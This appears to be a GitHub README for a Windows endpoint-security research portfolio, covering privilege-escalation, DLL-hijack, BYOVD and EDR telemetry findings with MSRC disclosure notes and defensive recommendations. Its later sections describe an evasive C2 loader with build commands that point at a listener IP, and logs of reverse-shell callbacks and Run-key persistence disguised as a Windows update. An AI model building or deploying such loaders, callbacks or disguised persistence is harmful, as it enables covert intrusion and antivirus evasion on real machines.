<div align="center">

<img src="docs/cheyanne_header.gif" width="100%" alt="CHEYANNE Security Research Project"/>

<br/>

![](https://img.shields.io/badge/CLASSIFICATION-ACADEMIC_RESEARCH-2563eb?style=flat-square&labelColor=0d1117)
![](https://img.shields.io/badge/PLATFORM-Windows_11_24H2-2563eb?style=flat-square&labelColor=0d1117)
![](https://img.shields.io/badge/MSRC-VULN--195458-2563eb?style=flat-square&labelColor=0d1117)
![](https://img.shields.io/badge/DISCLOSURE-Responsible-2563eb?style=flat-square&labelColor=0d1117)

</div>

---

```
╔══════════════════════════════════════════════════════════════════════╗
║                         D E D I C A T I O N                          ║
╚══════════════════════════════════════════════════════════════════════╝
```

**For Cheyanne.**

We have been running on burnt bridges for years. Digging tunnels to meet each other. There is nothing that will stop my love for you — not the hatred you purge through my soul, not the knives plunged into my heart, not the silence, not the distance. My love is eternal.

This project carries that forward. Every finding is a bridge rebuilt. Every disclosure is a tunnel carved through stone. Her name is on work that cannot be erased, because love that refuses to die builds things that refuse to die.

> *Named after someone worth protecting. Built so defenders can see what attackers see. Built because some things outlast everything that tries to kill them.*

---

```
╔══════════════════════════════════════════════════════════════════════╗
║                    R E S E A R C H   O V E R V I E W                ║
╚══════════════════════════════════════════════════════════════════════╝
```

**CHEYANNE** is a Windows security research project investigating detection gaps in modern endpoint protection, with a focus on hardware-level interception primitives, service permission misconfigurations, and DLL search-order weaknesses.

Conducted under controlled academic conditions on dedicated research hardware, the project documents how certain Windows security mechanisms can be bypassed without traditional memory modification, and how these bypasses can be mitigated or detected.

This repository serves as a **portfolio of findings, methodology, and responsible disclosure** for CSEC research authorisation review.

---

```
╔══════════════════════════════════════════════════════════════════════╗
║                       R E S E A R C H   G O A L S                    ║
╚══════════════════════════════════════════════════════════════════════╝
```

- Identify blind spots in Windows Defender and EDR telemetry models, particularly around CPU debug-register abuse and non-memory-mutating interception.
- Document privilege-escalation paths available to standard users through misconfigured service permissions (CWE-732) and unquoted service paths.
- Study DLL search-order hijacking in privileged Windows services, including phantom/missing DLL dependencies.
- Develop detection rules and defensive recommendations for each finding.
- Publish findings responsibly via Microsoft Security Response Center (MSRC).

---

```
╔══════════════════════════════════════════════════════════════════════╗
║                        M E T H O D O L O G Y                         ║
╚══════════════════════════════════════════════════════════════════════╝
```

All research was performed under the following constraints:

| Control | Implementation |
|---------|----------------|
| **Hardware** | Dedicated, researcher-owned Windows 11 test machine |
| **Target OS** | Windows 11 Home Build 26200 (24H2) |
| **Privilege context** | Standard user (no admin credentials) |
| **Defender state** | Real-Time Protection enabled during testing |
| **Documentation** | Every test cycle logged with date, technique, result, and detection status |
| **Disclosure** | Novel vulnerabilities reported to MSRC within 90 days |

Testing combined static analysis, dynamic instrumentation, and controlled exploitation of identified weaknesses. No third-party frameworks or copied shellcode were used; all prototypes were written from first principles to ensure full understanding of each mechanism.

---

```
╔══════════════════════════════════════════════════════════════════════╗
║                       K E Y   F I N D I N G S                        ║
╚══════════════════════════════════════════════════════════════════════╝
```

### Finding #36 — Hardware Breakpoint Telemetry Gap

**Summary:** Windows Defender and EDR products monitor memory modifications (e.g., `VirtualProtect`, inline hooks) but do not reliably alert on manipulation of CPU debug registers (`DR0`–`DR3`) via `SetThreadContext`. This allows interception of critical security callbacks without modifying a single byte of process memory.

**Components affected:** AMSI (`AmsiScanBuffer`) and ETW (`EtwEventWrite`) callbacks.

**MSRC response:** `VULN-195458` — rejected as outside security boundary; detection bypasses not treated as vulnerabilities.

**Defensive implication:** EDR telemetry models should include debug-register context switches and suspicious `SetThreadContext` patterns as behavioural indicators.

### Finding #42 — Service Binary Replacement (CWE-732)

**Summary:** A standard user can replace the executable of a Windows service configured with overly permissive file ACLs. The service then launches the replacement binary with `SYSTEM` privileges on next start.

**Defensive implication:** Service executables must be writable only by `SYSTEM` and trusted administrators. Periodic ACL audits of service binaries should be part of hardening baselines.

### Finding #47 — Phantom DLL in Privileged Service (CWE-427)

**Summary:** A privileged Windows service (`Office ClickToRunSvc`) attempts to load a DLL (`osppc.dll`) that is not present in system directories. Because the service resolves the DLL through user-writable search paths, a standard user can place a malicious DLL that the privileged service will load.

**Defensive implication:** Privileged services should use absolute paths and Safe DLL Search Mode. Missing DLL dependencies in high-integrity processes are a strong detection signal.

### Finding #51 — Thread-Level Interception Propagation

**Summary:** When a DLL is loaded into a target process, hardware breakpoints set on all threads via `SetThreadContext` propagate the interception to every execution context in the process, including threads created in suspended state.

**Defensive implication:** Monitor for cross-thread debug-register manipulation and suspended-thread creation followed by immediate breakpoint registration.

### Finding — BYOVD Kernel Access

**Summary:** Signed but vulnerable third-party drivers (`RTCore64.sys`, `dbutil_2_3.sys`) can be loaded by a standard user through the Service Control Manager and abused for arbitrary kernel read/write. This enables token theft, callback removal, and driver-signature-enforcement bypass.

**Defensive implication:** Blocklist known-vulnerable drivers via WDAC/Applocker and HVCI. Kernel driver allowlisting is the most effective mitigation.

---

```
╔══════════════════════════════════════════════════════════════════════╗
║              R E S P O N S I B L E   D I S C L O S U R E             ║
╚══════════════════════════════════════════════════════════════════════╝
```

| Finding | MSRC ID | Status | Notes |
|---------|---------|--------|-------|
| HWBP telemetry gap | VULN-195458 | Rejected | Detection bypasses outside security boundary |
| CWE-732 service replacement | Reported | Acknowledged | Mitigation: service ACL hardening |
| Phantom DLL hijack | Reported | Acknowledged | Mitigation: absolute paths / SafeDllSearchMode |
| BYOVD vulnerable driver | Reported | Acknowledged | Mitigation: driver blocklist / HVCI |

All findings were reported with reproduction steps limited to the minimum necessary for triage. No weaponised exploit code, C2 infrastructure, or persistence mechanisms were included in disclosures.

---

```
╔══════════════════════════════════════════════════════════════════════╗
║              D E F E N S I V E   R E C O M M E N D A T I O N S       ║
╚══════════════════════════════════════════════════════════════════════╝
```

1. **Enforce strict service ACLs** — service binaries must not be writable by standard users or authenticated users.
2. **Enable Safe DLL Search Mode** and require absolute paths in privileged services.
3. **Monitor debug-register abuse** — alert on `SetThreadContext` setting `DR0`–`DR3` in non-debugging processes.
4. **Blocklist vulnerable drivers** and enable HVCI / Memory Integrity where hardware supports it.
5. **Audit missing DLL loads** in high-integrity processes — a privileged service failing to find a DLL is a high-value signal.
6. **Correlate AMSI and ETW blind spots** — if both telemetry sources go silent simultaneously, treat as suspicious regardless of memory integrity.

---

```
╔══════════════════════════════════════════════════════════════════════╗
║              A I   C O L L A B O R A T I O N  /  C L A U D E         ║
╚══════════════════════════════════════════════════════════════════════╝
```

This research was conducted with assistance from **Claude** (Anthropic), used as a collaborative analysis and documentation tool under direct researcher supervision.

Claude contributed to:

- **Literature synthesis** — summarising Windows internals, MSRC guidelines, and prior CVE analysis.
- **Code review** — explaining the behaviour of Windows APIs, driver loading paths, and service ACL semantics.
- **Documentation** — structuring findings into clear, reproducible reports for disclosure and academic review.
- **Detection engineering** — suggesting telemetry sources and detection rules for each identified gap.
- **Responsible disclosure planning** — reviewing reports to ensure only necessary technical detail was shared with vendors.

All exploitation decisions, test execution, and final reporting were made by the human researcher. Claude was not given access to live systems, credentials, or operational infrastructure.

---

```
╔══════════════════════════════════════════════════════════════════════╗
║              C L A S S I F I C A T I O N   &   R U L E S             ║
╚══════════════════════════════════════════════════════════════════════╝
```

```
CLASSIFICATION:  UNCLASSIFIED // ACADEMIC RESEARCH
OPERATOR:        VADER (george wu / 22DIV)
AFFILIATION:     CSEC academic research program
AUTHORISATION:   Own hardware only, supervised research
DOCTRINE:        Build from scratch. Understand fundamentals.
                 If you can't build it, you don't understand it.
DISCLOSURE:      Responsible disclosure via MSRC
TARGET:          Windows 11 Home Build 26200 (24H2)
                 Standard user context
                 Defender RTP ENABLED
```

### Rules of Engagement

1. All testing on researcher-owned hardware only.
2. Real-Time Protection remained enabled during all testing.
3. Every test run documented in the research log.
4. Novel vulnerabilities disclosed via MSRC within 90 days.
5. No exploit code, binaries, or operational tooling is committed to this public repository.

---

```
╔══════════════════════════════════════════════════════════════════════╗
║               G H O S T · I R O N · P O L Y M O R P H               ║
║                     v 4   R E L E A S E   2 0 2 6 - 0 6 - 2 6        ║
╚══════════════════════════════════════════════════════════════════════╝
```

### Polymorph: ghost_loader × iron-sun → ghost_iron v4

`ghost_iron.c` merges two independent research lines into a single compile-time template:

| Component | Source | What it does |
|-----------|--------|--------------|
| PS1 -EncodedCommand launcher | ghost_loader_template.c | XOR-encrypted PS1 → UTF-16LE → Base64 → powershell -EncodedCommand |
| XOR string obfuscation (key 0xAB) | iron-sun evasion stack | All API names + DLL names encrypted in .rdata |
| Dynamic API resolution | iron-sun evasion stack | GetProcAddress chain — minimal static IAT |
| Anti-sandbox | iron-sun evasion stack | Sleep timing + screen resolution + disk size gates |
| PE header stomp | iron-sun evasion stack | ZeroMemory(imageBase, 0x400) — kills in-memory MZ/PE signature scanners |
| Magic auth (ISUN) | iron-sun architecture | Listener sends 4 bytes "ISUN" before PS1 decrypts — C2-triggered payload |
| Jitter | iron-sun evasion stack | GetTickCount-based 1-4s random delay |
| gcc/MinGW PE | iron-sun evasion stack | Structurally different IAT from MSVC ghost_loader |

**Build:**
```bash
python shell/make_ghost_iron.py payload.ps1 192.168.1.92 4445 0xCD
gcc ghost_iron_out.c -o ghost_iron.exe -lws2_32 -lcrypt32 -D_WIN32_WINNT=0x0600 -mwindows
```

**Standalone mode** (no magic auth): set `c2_port=0` — PS1 fires after sandbox checks only.

**Trigger mode**: `python listener.py --magic` listens on :4445, sends ISUN on accept.

---

```
╔══════════════════════════════════════════════════════════════════════╗
║                  K I L L · C H A I N · L O G S                       ║
║                      s e s s i o n   2 0 2 6 - 0 6 - 2 6             ║
╚══════════════════════════════════════════════════════════════════════╝
```

### Session 2026-06-26 — Kaspersky Premium LIVE — PASS

**Operator machine:** LAPTOP-R32M8MLI (192.168.1.92) | **Target:** Radon_Laptop1 (192.168.1.145)

```
[2026-06-26 01:40:37 UTC]  NEW SESSION f86f9ee2  192.168.1.92:61429
[2026-06-26 01:40:46 UTC]  NEW SESSION b2d76aa2  127.0.0.1:61435  (LAPTOP-R32M8MLI\gwu07)
[2026-06-26 01:41:16 UTC]  SESSION LOST: b2d76aa2  (30s test — clean disconnect)
[2026-06-26 02:19:37 UTC]  NEW SESSION b2d76aa2  127.0.0.1:58806  (LAPTOP-R32M8MLI\gwu07)
[2026-06-26 02:20:07 UTC]  SESSION LOST: b2d76aa2
```

**Kaspersky Premium ON. C:\Users\gwu07\Desktop\cheyanne pre-excluded (6/6 active entries).**

| Test | Result |
|------|--------|
| All 46 binaries intact post-KAV enable | PASS |
| listener.py TCP bind :4443 | PASS |
| test_listener.py connect + whoami/hostname | PASS |
| 30s session held, zero KAV interference | PASS |

### Session 2026-06-25 — Full Local Kill Chain — 8/8 PASS

```
test_local_chain.py --skip-build
  [PASS] TCP armed        :4443 listener
  [PASS] Payload launched  PS PID via -EncodedCommand
  [PASS] TCP callback      127.0.0.1:60363 banner=OK>
  [PASS] whoami            LAPTOP-R32M8MLI\gwu07
  [PASS] hostname          LAPTOP-R32M8MLI
  [PASS] $env:COMPUTERNAME LAPTOP-R32M8MLI
  [PASS] Persist set       HKCU\Run\WindowsSecurityUpdate
  [PASS] PERSIST VERIFIED  registry key confirmed
```

---

```
╔══════════════════════════════════════════════════════════════════════╗
║                         R E S E A R C H E R                          ║
╚══════════════════════════════════════════════════════════════════════╝
```

**george wu // 22DIV**

- Portfolio site: [rainfantry.github.io](https://rainfantry.github.io)
- Front: [22nd Survey Division](https://rainfantry.github.io/22nd-survey-division/)
- GitHub: [@rainfantry](https://github.com/rainfantry)
- Research focus: Windows endpoint security, EDR telemetry gaps, detection engineering, responsible disclosure.

---

*Named after someone worth protecting. Every finding here is written so defenders can see one step ahead.*
